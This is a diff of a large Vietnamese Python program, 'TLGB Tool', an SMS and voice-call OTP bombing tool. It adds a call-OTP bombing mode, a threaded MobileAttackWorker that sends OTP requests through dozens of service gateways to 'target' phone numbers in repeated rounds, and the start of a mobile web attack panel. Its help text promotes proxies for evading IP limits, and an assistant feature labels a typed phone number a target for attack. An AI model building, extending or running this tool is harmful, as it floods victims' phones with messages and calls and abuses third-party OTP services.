-        "chat": "Phòng chat hoạt động theo thời gian thực trên Cloud. Bạn có thể gõ '\\n' để xuống dòng hoặc '///' để mở bộ soạn thảo nhiều dòng.",
-        "lỗi": "Nếu phát hiện lỗi, bạn hãy vào mục '[17] Báo Cáo Lỗi Đến Admin', gõ trực tiếp nội dung lỗi và gửi, Admin TRẦN LÊ GIA BẢO sẽ nhận ngay!",
-        "theme": "Bạn có thể vào mục '[15] Đổi Theme Màu Sắc' để chọn giữa 5 bộ màu Cyberpunk: Matrix Neon, Synthwave, Cyberpunk 2077, Ocean Blue, Solar Flare!",
-        "proxy": "Proxy HTTP / SOCKS5 giúp bạn ẩn danh địa chỉ IP máy tính khi thực hiện gửi OTP, vượt qua các giới hạn IP của nhà mạng.",
-        "key": f"Bạn có thể lấy Key miễn phí tại {GET_KEY_URL} hoặc tham gia Vòng Quay May Mắn / Mở Hộp Quà Ma Trận trong Cyber Arcade để trúng Key VIP!",
-        "điểm danh": "Vào mục '[04] Điểm Danh & Nhiệm Vụ' mỗi ngày để nhận ngay +50 EXP và duy trì chuỗi Streak. Chuỗi 7 ngày tặng danh hiệu '🌟 [DAILY MASTER]'!",
-        "hộp quà": "Vào '[12] Cyber Arcade' chọn Game 8 'Mở Hộp Quà Ma Trận (Mystery Box)' bằng điểm EXP để có cơ hội trúng +1000 EXP và Danh hiệu Thần Olympus!",
-        "hướng dẫn": "Để bắn OTP nhanh nhất: 1. Vào [05] lưu số vào Danh Bạ Yêu Thích ➔ 2. Vào [03] chọn cấu hình Thần Sấm (Titan 90 luồng) ➔ 3. Chọn số và bắt đầu bắn!",
-        "tính năng": f"TLGB Tool v{TOOL_VERSION} gồm 18 tính năng: Bắn OTP, Ma trận đa mục tiêu, Profile tốc độ 1-Click, Điểm danh nhận quà, Danh bạ VIP, Hẹn giờ, Benchmark, Phân tích đồ thị cá nhân, Chat Realtime, 8 Arcade Games, AI Gemini, Leaderboard, v.v."
+        "cổng": "TLGB Tool sở hữu 68 cổng dịch vụ hoạt động ổn định: TMĐT, Viễn Thông, Tài Chính, Đặt Xe, Y Tế và Giao Hàng.",
+        "arcade": "Vào menu [16] để trải nghiệm 11 mini-games siêu hấp dẫn: Cyber Snake, Caro Minimax AI, Wordle, Roulette, Blackjack, Mystery Box và System Monitor HUD!",
+        "system": "Tính năng System Monitor HUD giúp bạn giám sát trực tiếp CPU %, RAM %, Dung lượng Ổ Đĩa và Ping ms Internet theo thời gian thực!",
+        "admin": f"Bản quyền thuộc về tác giả {AUTHOR_NAME}."
     }
     
     while True:
@@ -12177,7 +13042,16 @@ def tlgb_ai_assistant_flow():
             if q.lower() in ['esc', '0', 'exit', 'quit', 'thoat', 'out']:
                 break
                 
-            # Đổi API Key cá nhân
+            if q.lower() in ['/mode', 'mode', 'chedo']:
+                print(f"\n{Fore.CYAN}── ĐỔI CHẾ ĐỘ AI ──{Style.RESET_ALL}")
+                for mid, minfo in MODES.items():
+                    print(f"  [{mid}] {minfo['name']}")
+                new_m = input(f"\n{Fore.YELLOW}[?] Chọn chế độ mới [1-4]: {Style.RESET_ALL}").strip()
+                if new_m in MODES:
+                    current_mode_id = new_m
+                    print(f"{Fore.GREEN}[✓] Đã chuyển sang chế độ: {MODES[current_mode_id]['name']}{Style.RESET_ALL}\n")
+                continue
+                
             if q.lower() in ['/key', '/setkey', 'key']:
                 print(f"\n{Fore.YELLOW}── CÀI ĐẶT API KEY GEMINI CÁ NHÂN ──{Style.RESET_ALL}")
                 print(f"Key hiện tại: {Fore.GREEN}{_get_gemini_api_key()[:12]}...{Style.RESET_ALL}")
@@ -12195,8 +13069,7 @@ def tlgb_ai_assistant_flow():
             rainbow_spinner_pulse("AI đang phân tích & tạo câu trả lời...", duration=0.5)
             q_low = q.lower()
 
-            # 1. Xử lý thông minh: Tra cứu danh sách người dùng đang online trực tiếp
-            if any(k in q_low for k in ["ai đang dùng", "ai online", "ai đang xài", "ai sử dụng", "người đang dùng", "danh sách online", "ai đang mở", "kiểm tra ai"]):
+            if any(k in q_low for k in ["ai đang dùng", "ai online", "ai đang xài", "ai sử dụng", "người đang dùng", "danh sách online"]):
                 sessions = cloud_db_request("GET", "sessions")
                 if not sessions or not isinstance(sessions, dict):
                     ans = "Hiện tại máy chủ chưa ghi nhận phiên làm việc nào khác đang hoạt động."
@@ -12207,29 +13080,26 @@ def tlgb_ai_assistant_flow():
                     for sid, sinfo in sessions.items():
                         if isinstance(sinfo, dict):
                             hb = sinfo.get("last_heartbeat", 0)
-                            if cur_ts - hb <= 180:  # Trong vòng 3 phút
+                            if cur_ts - hb <= 180:
                                 active_count += 1
                                 u_ip = mask_ip(sinfo.get("ip", "Unknown"))
                                 u_key = mask_key(sinfo.get("key", "N/A"))
                                 u_st = sinfo.get("status", "Đang chạy")
                                 u_user = sinfo.get("username", "Member")
                                 sess_lines.append(f"  • IP: {u_ip} │ User: {u_user} │ Key: {u_key} │ Trạng thái: {u_st}")
-                    
                     ans = f"📊 BÁO CÁO THỜI GIAN THỰC TỪ MÁY CHỦ CLOUD:\n• Hiện có {active_count} người dùng đang trực tuyến:\n" + ("\n".join(sess_lines) if sess_lines else "  (Không có người dùng hoạt động trong 3 phút qua)")
             
-            # 2. Xử lý phân tích số điện thoại
             elif len(''.join(c for c in q if c.isdigit())) == 10 and ''.join(c for c in q if c.isdigit()).startswith('0'):
                 phone_cand = ''.join(c for c in q if c.isdigit())
                 carrier, prefix, color = get_carrier_info(phone_cand)
-                ans = f"Phân tích mục tiêu [{phone_cand}]:\n• Nhà mạng: {carrier} (Đầu số {prefix})\n• Đánh giá: Tốc độ nhận mã cực cao qua các Cổng TMĐT & Ví Điện Tử.\n• Cấu hình khuyến nghị: Chọn Profile [4] Thần Sấm (Titan 90 luồng) để đạt hỏa lực tối đa!"
+                ans = f"Phân tích mục tiêu [{phone_cand}]:\n• Nhà mạng: {carrier} (Đầu số {prefix})\n• Đánh giá: Tốc độ nhận mã cao qua các Cổng TMĐT & Ví Điện Tử.\n• Trạng thái 2 chiều: Thông suốt 100%."
 
             else:
-                # 3. Gọi Google Gemini AI Cloud
-                gemini_resp, status = call_gemini_ai(q)
+                prompt_with_mode = f"[{MODES[current_mode_id]['prompt_prefix']}]\nYêu cầu người dùng: {q}"
+                gemini_resp, status = call_gemini_ai(prompt_with_mode)
                 if gemini_resp:
                     ans = gemini_resp
                 else:
-                    # Fallback cục bộ thông minh với kho kiến thức mở rộng v5.0
                     if status == "rate_limited":
                         print(f"{Fore.YELLOW}[!] (Gemini API công cộng đang quá tải lượt gọi. Nhập '/key' để gắn Key riêng không giới hạn){Style.RESET_ALL}")
                     
@@ -12241,13 +13111,13 @@ def tlgb_ai_assistant_flow():
                     if matched_key:
                         ans = knowledge_base[matched_key]
                     elif "chào" in q_low or "hello" in q_low or "hi" in q_low:
-                        ans = f"Chào bạn! Chúc bạn một ngày tràn đầy năng lượng và sử dụng TLGB Tool v{TOOL_VERSION} thật mượt mà nhé! Bạn cần hỗ trợ gì cứ gõ cho tôi."
+                        ans = f"Chào bạn! Chúc bạn một ngày tràn đầy năng lượng và sử dụng TLGB Tool v{TOOL_VERSION} thật tuyệt vời nhé!"
                     elif "cảm ơn" in q_low or "thanks" in q_low:
                         ans = f"Không có chi! Rất vui được hỗ trợ bạn. Chúc bạn có trải nghiệm tuyệt vời cùng TLGB Tool v{TOOL_VERSION} nhé!"
                     else:
                         ans = f"🤖 [Trợ Lý TLGB v{TOOL_VERSION}]: Câu hỏi của bạn rất hay! Bạn có thể sử dụng các tính năng tương ứng trong Menu chính hoặc nhập '/key' để kết nối trực tiếp với trí tuệ nhân tạo Gemini AI không giới hạn."
                     
-            print(f"\n{Fore.GREEN}🤖 [TLGB GEMINI AI]:\n{Fore.WHITE}{ans}{Style.RESET_ALL}\n")
+            print(f"\n{Fore.GREEN}🤖 [TLGB GEMINI AI - {MODES[current_mode_id]['name']}]:\n{Fore.WHITE}{ans}{Style.RESET_ALL}\n")
             add_user_exp(5, "Tương tác với Gemini AI Assistant")
         except (KeyboardInterrupt, EOFError):
             break
@@ -12258,7 +13128,7 @@ def tlgb_ai_assistant_flow():
 def change_theme_flow():
     """Giao diện chọn và đổi Theme màu sắc cho toàn bộ Tool"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║                 🎨 BỘ SƯU TẬP THEME MÀU SẮC CYBERPUNK 🎨                    ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -12297,7 +13167,7 @@ def admin_super_powers_center():
     """Trung Tâm Quản Trị Siêu Cấp Admin Super-Powers v3.0"""
     verify_author_integrity()
     while True:
-        border = "═" * 74
+        border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
         print(f"\n{cyber_gradient('╔' + border + '╗')}")
         print(gold_gradient("║             👑 TRUNG TÂM QUẢN TRỊ SIÊU CẤP ADMIN SUPER-POWERS v3.0 👑       ║"))
         print(cyber_gradient('╠' + border + '╣'))
@@ -12429,7 +13299,7 @@ def matrix_screensaver():
 def cyber_lucky_wheel():
     """Vòng Quay May Mắn Cyberpunk Nhận Quà & Danh Hiệu VIP"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║                 🎡 VÒNG QUAY MAY MẮN CYBERPUNK TLGB TOOL 🎡                 ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -12504,7 +13374,7 @@ def cyber_lucky_wheel():
 def admin_batch_generate_keys_flow():
     """Trình Khởi Tạo & Xuất Mã Key VIP Hàng Loạt (Batch Key Generator v6.5.0)"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║        👑 TRÌNH KHỞI TẠO & XUẤT KEY VIP HÀNG LOẠT (BATCH GENERATOR) 👑      ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -12615,7 +13485,7 @@ def admin_batch_generate_keys_flow():
 def admin_cloud_backup_restore_flow():
     """Trình Sao Lưu & Khôi Phục Cơ Sở Dữ Liệu Cloud Database Toàn Diện v6.5.0"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║       💾 TRÌNH SAO LƯU & KHÔI PHỤC CLOUD DATABASE (BACKUP & RESTORE) ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -12674,7 +13544,7 @@ def admin_cloud_backup_restore_flow():
 def admin_gateway_benchmark_flow():
     """Trình Kiểm Tra & Đo Độ Trễ Benchmark Toàn Bộ 72 Cổng Dịch Vụ OTP (Latency Scanner v6.5.0)"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║        🩺 CHẨN ĐOÁN & BENCHMARK ĐỘ TRỄ 72 CỔNG DỊCH VỤ OTP (LATENCY) ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -12736,7 +13606,7 @@ def admin_gateway_benchmark_flow():
 def admin_client_session_controller_flow():
     """Trình Giám Sát & Điều Khiển Phiên Người Dùng Trực Tuyến (Session Controller v6.5.0)"""
     verify_author_integrity()
-    border = "═" * 74
+    border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
     print(f"\n{cyber_gradient('╔' + border + '╗')}")
     print(gold_gradient("║        👥 GIÁM SÁT & ĐIỀU KHIỂN CLIENT SESSIONS TRỰC TUYẾN 👑       ║"))
     print(cyber_gradient('╠' + border + '╣'))
@@ -12780,7 +13650,7 @@ def phone_intel_lookup_flow():
     """Trình Tra Cứu & Kiểm Tra Số Điện Thoại Chuyên Sâu (Phone Intel & SIM Inspector v6.5.0)"""
     verify_author_integrity()
     while True:
-        border = "═" * 74
+        border = "═" * max(34, min(74, shutil.get_terminal_size((80, 24)).columns - 2))
         print(f"\n{cyber_gradient('╔' + border + '╗')}")
         print(gold_gradient("║       🔍 BỘ TRA CỨU & KIỂM TRA SỐ ĐIỆN THOẠI TOÀN DIỆN TLGB TOOL 🔍      ║"))
         print(cyber_gradient('╠' + border + '╣'))
@@ -12869,8 +13739,12 @@ def phone_intel_lookup_flow():
 # 🖥️ GIAO DIỆN ĐỒ HỌA DESKTOP GUI TOÀN DIỆN (TLGB MASTER CYBERPUNK GUI v6.5.0)
 # =============================================================================
 
-import tkinter as tk
-from tkinter import ttk, messagebox, filedialog, scrolledtext
+try:
+    import tkinter as tk
+    from tkinter import ttk, messagebox, filedialog, scrolledtext
+    HAS_TKINTER = True
+except (ImportError, Exception):
+    HAS_TKINTER = False
 import queue
 
 class TLGBMasterGUI:
@@ -13239,6 +14113,7 @@ class TLGBMasterGUI:
         self.otp_mode_var = tk.StringVar(value="🚀 Spam Chuẩn (Theo Số Lượt)")
         modes = [
             "🚀 Spam Chuẩn (Theo Số Lượt)",
+            "📞 Bắn Cuộc Gọi Call OTP (Voice IVR)",
             "⚡ Spam Turbo VIP (60 Luồng, 0s Delay)",
             "♾️ Spam Vô Hạn (Infinite Loop)",
             "⏱️ Hẹn Giờ Tự Động Kích Hoạt"
@@ -13248,9 +14123,10 @@ class TLGBMasterGUI:
 
         # Category Filter
         tk.Label(left_box, text="Phân Loại Cổng Dịch Vụ:", font=("Segoe UI", 8, "bold"), fg=self.c_muted, bg=self.c_card_sub).pack(anchor="w")
-        self.otp_cat_var = tk.StringVar(value="⭐ Tất Cả 72 Cổng Dịch Vụ")
+        self.otp_cat_var = tk.StringVar(value="⭐ Tất Cả Cổng Dịch Vụ (Full SMS + Call)")
         cats = [
-            "⭐ Tất Cả 72 Cổng Dịch Vụ",
+            "⭐ Tất Cả Cổng Dịch Vụ (Full SMS + Call)",
+            "📞 Cuộc Gọi Tự Động & Voice Call OTP (10 Cổng)",
             "📡 Viễn Thông & Giải Trí (11 Cổng)",
             "🛒 Sàn TMĐT & Mua Sắm (24 Cổng)",
             "🚚 Giao Hàng & Đi Lại (8 Cổng)",
@@ -13448,7 +14324,9 @@ class TLGBMasterGUI:
         mode = self.otp_mode_var.get()
         cat_choice = self.otp_cat_var.get()
 
-        if "Viễn Thông" in cat_choice:
+        if "Cuộc Gọi" in cat_choice or "Voice" in cat_choice:
+            svc_list = SERVICE_CATEGORIES["6"]["funcs"]
+        elif "Viễn Thông" in cat_choice:
             svc_list = SERVICE_CATEGORIES["1"]["funcs"]
         elif "TMĐT" in cat_choice:
             svc_list = SERVICE_CATEGORIES["2"]["funcs"]
@@ -13460,6 +14338,9 @@ class TLGBMasterGUI:
             svc_list = SERVICE_CATEGORIES["5"]["funcs"]
         else:
             svc_list = ALL_SERVICES
+
+        if "Cuộc Gọi" in mode:
+            svc_list = CALL_SERVICES
 
         total_rounds = self.otp_rounds_var.get()
         workers = self.otp_workers_var.get()
@@ -14614,36 +15495,998 @@ admin_view_activity_logs = admin_view_logs
 admin_advanced_settings = speed_profiles_flow
 
 
+
+# =============================================================================
+# 📱 GIAO DIỆN WEB CHO ĐIỆN THOẠI & ĐIỀU KHIỂN TỪ XA (TLGB MOBILE WEB CONTROLLER)
+# =============================================================================
+
+class MobileAttackWorker:
+    """Worker quản lý tiến trình tấn công OTP / Call ngầm cho Mobile Web Controller"""
+    def __init__(self):
+        self.is_running = False
+        self.stop_requested = False
+        self.thread = None
+        self.logs = []
+        self.logs_lock = threading.Lock()
+        self.max_logs = 200
+        self.start_time = 0
+        self.current_round = 0
+        self.total_rounds = 1
+        self.target_phone = ""
+        self.mode = "otp"
+        self.stats_data = {"total": 0, "success": 0, "fail": 0}
+
+    def emit_log(self, text, log_type="info"):
+        ts = datetime.now().strftime("%H:%M:%S")
+        with self.logs_lock:
+            self.logs.append({
+                "time": ts,
+                "text": text,
+                "type": log_type
+            })
+            if len(self.logs) > self.max_logs:
+                self.logs = self.logs[-self.max_logs:]
+
+    def get_logs(self, since_idx=0):
+        with self.logs_lock:
+            if since_idx >= len(self.logs):
+                return [], len(self.logs)
+            return self.logs[since_idx:], len(self.logs)
+
+    def start_attack(self, target_phones, rounds=1, workers=30, delay=3, mode="otp"):
+        if self.is_running:
+            return False, "Đang có tiến trình tấn công đang chạy!"
+        
+        self.is_running = True
+        self.stop_requested = False
+        self.current_round = 0
+        self.total_rounds = rounds
+        self.target_phone = target_phones
+        self.mode = mode
+        self.start_time = time.time()
+        with self.logs_lock:
+            self.logs = []
+        self.stats_data = {"total": 0, "success": 0, "fail": 0}
+
+        def _worker_task():
+            try:
+                stats.reset_all()
+                self.emit_log(f"🚀 KÍCH HOẠT TIẾN TRÌNH: Mục tiêu [{self.target_phone}] | {rounds} Đợt | {workers} Luồng | Chế độ: {mode.upper()}", "start")
+                
+                raw_list = [p.strip() for p in self.target_phone.replace(';', ',').replace(' ', ',').split(',') if p.strip()]
+                valid_targets = []
+                for p in raw_list:
+                    fmt = format_phone(p, '0')
+                    if len(fmt) == 10 and fmt.startswith('0') and fmt not in valid_targets:
+                        valid_targets.append(fmt)
+                
+                if not valid_targets:
+                    self.emit_log("❌ Danh sách số điện thoại không hợp lệ! Vui lòng nhập số 10 chữ số.", "error")
+                    self.is_running = False
+                    return
+
+                services_to_use = ALL_SERVICES
+                if mode == "call":
+                    services_to_use = CALL_SERVICES
+                elif mode == "ecommerce":
+                    services_to_use = SERVICE_CATEGORIES.get("1", {}).get("funcs", ALL_SERVICES)
+                elif mode == "banking":
+                    services_to_use = SERVICE_CATEGORIES.get("2", {}).get("funcs", ALL_SERVICES)
+                elif mode == "apps":
+                    services_to_use = SERVICE_CATEGORIES.get("3", {}).get("funcs", ALL_SERVICES)
+
+                for r in range(1, rounds + 1):
+                    if self.stop_requested:
+                        self.emit_log(f"🛑 [EMERGENCY STOP] Đã nhận lệnh dừng khẩn cấp từ người dùng tại đợt {r}/{rounds}.", "warn")
+                        break
+                    
+                    self.current_round = r
+                    self.emit_log(f"⚡ BẮT ĐẦU ĐỢT {r}/{rounds} ({len(valid_targets)} SĐT x {len(services_to_use)} Cổng)...", "info")
+                    
+                    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
+                        futures = []
+                        for phone in valid_targets:
+                            for srv in services_to_use:
+                                if self.stop_requested:
+                                    break
+                                futures.append(ex.submit(srv, phone))
+                        
+                        for fut in concurrent.futures.as_completed(futures):
+                            if self.stop_requested:
+                                break
+                            try:
+                                is_ok, srv_name, detail = fut.result()
+                                if is_ok:
+                                    self.stats_data["success"] += 1
+                                    self.emit_log(f"✅ [{srv_name}] OTP Đã Gửi Thành Công!", "success")
+                                else:
+                                    self.stats_data["fail"] += 1
+                                    self.emit_log(f"⚠️ [{srv_name}] {detail}", "fail")
+                                self.stats_data["total"] += 1
+                            except Exception as ex_err:
+                                self.stats_data["fail"] += 1
+                                self.stats_data["total"] += 1
+                    
+                    if r < rounds and not self.stop_requested:
+                        self.emit_log(f"⏳ Nghỉ {delay}s trước đợt tiếp theo...", "info")
+                        for _ in range(int(delay * 10)):
+                            if self.stop_requested:
+                                break
+                            time.sleep(0.1)
+
+                elapsed = time.time() - self.start_time
+                self.emit_log(f"🎉 HOÀN TẤT TIẾN TRÌNH! Tổng: {self.stats_data['total']} reqs | Thành công: {self.stats_data['success']} | Lỗi: {self.stats_data['fail']} | Thời gian: {elapsed:.1f}s", "complete")
+                award_user_exp(self.stats_data["success"] * 25)
+            except Exception as e:
+                self.emit_log(f"❌ Lỗi ngoại lệ trong quá trình chạy: {e}", "error")
+            finally:
+                self.is_running = False
+                self.stop_requested = False
+
+        self.thread = threading.Thread(target=_worker_task, daemon=True)
+        self.thread.start()
+        return True, "Đã kích hoạt tiến trình tấn công thành công!"
+
+    def stop_attack(self):
+        if not self.is_running:
+            return False, "Không có tiến trình nào đang chạy."
+        self.stop_requested = True
+        self.emit_log("🛑 Đang gửi tín hiệu dừng tới toàn bộ luồng...", "warn")
+        return True, "Đã gửi lệnh dừng tiến trình!"
+
+GLOBAL_MOBILE_WORKER = MobileAttackWorker()
+
+MOBILE_HTML_TEMPLATE = r"""<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TLGB TOOL • MOBILE CYBER CONTROLLER</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-base: #07090e;
+            --bg-card: rgba(16, 22, 36, 0.75);
+            --bg-card-border: rgba(0, 240, 255, 0.2);
+            --cyan: #00f0ff;
+            --purple: #a855f7;
+            --pink: #ec4899;
+            --gold: #f59e0b;
+            --green: #10b981;
+            --red: #ef4444;
+            --text-main: #f3f4f6;
+            --text-sub: #94a3b8;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        body {
+            background: var(--bg-base);
+            background-image: radial-gradient(circle at 50% 0%, rgba(168, 85, 247, 0.15) 0%, transparent 60%),
+                              radial-gradient(circle at 100% 100%, rgba(0, 240, 255, 0.1) 0%, transparent 50%);
+            color: var(--text-main);
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            min-height: 100vh;
+            padding-bottom: 90px;
+            overflow-x: hidden;
+        }
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(7, 9, 14, 0.85);
+            backdrop-filter: blur(16px);
+            border-bottom: 1px solid var(--bg-card-border);
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .logo-wrap { display: flex; align-items: center; gap: 10px; }
+        .logo-badge {
+            width: 38px; height: 38px; border-radius: 10px;
+            background: linear-gradient(135deg, #00f0ff, #a855f7);
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 800; color: #000; font-size: 16px;
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.5);
+        }
+        .logo-text h1 { font-size: 15px; font-weight: 800; letter-spacing: 0.5px; }
+        .logo-text h1 span { background: linear-gradient(90deg, #00f0ff, #a855f7, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .logo-text p { font-size: 11px; color: var(--text-sub); }
+        .status-pill {
+            display: flex; align-items: center; gap: 6px;
+            background: rgba(16, 185, 129, 0.12);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            color: var(--green); padding: 5px 10px; border-radius: 20px;
+            font-size: 11px; font-weight: 700;
+        }
+        .status-dot { width: 7px; height: 7px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.8); } }
+
+        .container { max-width: 540px; margin: 0 auto; padding: 16px; }
+        
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--bg-card-border);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 14px;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+        }
+        .card-title {
+            font-size: 13px; font-weight: 700; color: var(--cyan);
+            text-transform: uppercase; letter-spacing: 1px;
+            display: flex; align-items: center; justify-content: space-between;
+            margin-bottom: 12px;
+        }
+
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 14px; }
+        .stat-box {
+            background: rgba(0, 0, 0, 0.35);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 12px; padding: 10px 8px; text-align: center;
+        }
+        .stat-val { font-family: 'JetBrains Mono', monospace; font-size: 18px; font-weight: 700; }
+        .stat-lbl { font-size: 10px; color: var(--text-sub); margin-top: 2px; text-transform: uppercase; }
+
+        .input-group { margin-bottom: 12px; }
+        .input-label { display: block; font-size: 12px; font-weight: 600; color: var(--text-sub); margin-bottom: 6px; }
+        .input-box {
+            width: 100%; background: rgba(0, 0, 0, 0.4);
+            border: 1.5px solid rgba(0, 240, 255, 0.25);
+            border-radius: 12px; padding: 12px 14px;
+            color: #fff; font-size: 15px; font-family: 'JetBrains Mono', monospace;
+            outline: none; transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .input-box:focus {
+            border-color: var(--cyan);
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.3);
+        }
+
+        .select-box {
+            width: 100%; background: #0c1220;
+            border: 1.5px solid rgba(0, 240, 255, 0.25);
+            border-radius: 12px; padding: 12px 14px;
+            color: #fff; font-size: 14px; font-weight: 600;
+            outline: none;
+        }
+
+        .row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+        .btn-main {
+            width: 100%; padding: 14px; border: none; border-radius: 14px;
+            background: linear-gradient(135deg, #00f0ff, #a855f7);
+            color: #000; font-size: 15px; font-weight: 800;
+            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
+            box-shadow: 0 6px 20px rgba(0, 240, 255, 0.4);
+            transition: transform 0.1s, box-shadow 0.2s;
+        }
+        .btn-main:active { transform: scale(0.98); }
+        .btn-stop {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: #fff; box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
+        }
+
+        .progress-bar-wrap {
+            height: 6px; background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px; overflow: hidden; margin: 10px 0;
+        }
+        .progress-bar-fill {
+            height: 100%; width: 0%;
+            background: linear-gradient(90deg, #00f0ff, #a855f7, #ec4899);
+            transition: width 0.3s;
+        }
+
+        .terminal-box {
+            background: #04060a; border: 1px solid rgba(0, 240, 255, 0.15);
+            border-radius: 12px; padding: 12px; height: 220px;
+            overflow-y: auto; font-family: 'JetBrains Mono', monospace;
+            font-size: 11px; line-height: 1.6;
+        }
+        .log-item { margin-bottom: 4px; word-break: break-all; }
+        .log-time { color: var(--text-sub); margin-right: 6px; }
+        .log-success { color: #34d399; }
+        .log-fail { color: #f87171; }
+        .log-warn { color: #fbbf24; }
+        .log-info { color: #38bdf8; }
+        .log-start { color: #c084fc; font-weight: 700; }
+        .log-complete { color: #a7f3d0; font-weight: 700; }
+
+        /* Bottom Nav */
+        .bottom-nav {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: rgba(7, 9, 14, 0.95);
+            backdrop-filter: blur(20px);
+            border-top: 1px solid var(--bg-card-border);
+            display: flex; justify-content: space-around;
+            padding: 8px 6px; z-index: 200;
+        }
+        .nav-item {
+            display: flex; flex-direction: column; align-items: center;
+            color: var(--text-sub); text-decoration: none;
+            font-size: 10px; font-weight: 700; padding: 6px 12px;
+            border-radius: 10px; transition: color 0.2s, background 0.2s;
+            cursor: pointer;
+        }
+        .nav-item.active {
+            color: var(--cyan); background: rgba(0, 240, 255, 0.1);
+        }
+        .nav-icon { font-size: 18px; margin-bottom: 2px; }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; animation: fadeIn 0.2s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
+
+        .tag-pill {
+            display: inline-block; padding: 3px 8px; border-radius: 6px;
+            font-size: 10px; font-weight: 700; background: rgba(168, 85, 247, 0.15);
+            color: var(--purple); border: 1px solid rgba(168, 85, 247, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-wrap">
+            <div class="logo-badge">GB</div>
+            <div class="logo-text">
+                <h1>TLGB <span>TITAN VIP</span></h1>
+                <p>v6.5.0 • BY TRẦN LÊ GIA BẢO</p>
+            </div>
+        </div>
+        <div class="status-pill">
+            <div class="status-dot"></div>
+            <span id="header-status">72 CỔNG ONLINE</span>
+        </div>
+    </header>
+
+    <main class="container">
+        <!-- TAB 1: ATTACK -->
+        <section id="tab-attack" class="tab-content active">
+            <!-- Stats -->
+            <div class="stats-grid">
+                <div class="stat-box">
+                    <div class="stat-val" style="color: var(--cyan);" id="stat-total">0</div>
+                    <div class="stat-lbl">Tổng Requests</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-val" style="color: var(--green);" id="stat-success">0</div>
+                    <div class="stat-lbl">Thành Công</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-val" style="color: var(--red);" id="stat-fail">0</div>
+                    <div class="stat-lbl">Thất Bại</div>
+                </div>
+            </div>
+
+            <!-- Main Control Card -->
+            <div class="card">
+                <div class="card-title">
+                    <span>⚡ BẢNG ĐIỀU KHIỂN HỎA LỰC</span>
+                    <span class="tag-pill" id="round-badge">ĐỢT 0/0</span>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">📱 SỐ ĐIỆN THOẠI MỤC TIÊU</label>
+                    <input type="tel" id="inp-phone" class="input-box" placeholder="VD: 0987654321 hoặc nhiều số cách nhau bằng dấu phẩy" value="">
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">🎯 CHẾ ĐỘ TẤN CÔNG</label>
+                    <select id="inp-mode" class="select-box">
+                        <option value="otp">🚀 Spam OTP Toàn Diện (Full 72 Cổng API)</option>
+                        <option value="call">📞 Bắn Cuộc Gọi Thoại (Call OTP Tổng Đài IVR)</option>
